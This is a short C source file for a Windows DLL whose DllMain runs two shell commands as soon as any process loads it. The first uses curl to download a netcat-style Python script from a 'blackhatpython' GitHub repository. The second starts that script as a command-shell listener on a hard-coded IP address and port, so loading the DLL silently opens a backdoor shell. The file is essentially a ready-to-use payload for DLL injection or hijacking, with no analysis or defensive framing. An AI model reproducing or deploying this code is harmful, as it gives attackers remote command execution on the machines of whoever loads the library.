#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system ("curl https://raw.githubusercontent.com/stackviolator/blackhatpython/main/networking/netcat/netcat.py -o .\\nc.py");
            i = system ("python .\\nc.py -t 10.0.71.105 -l -c -p 9696");
            break;
    }
    return TRUE;
}
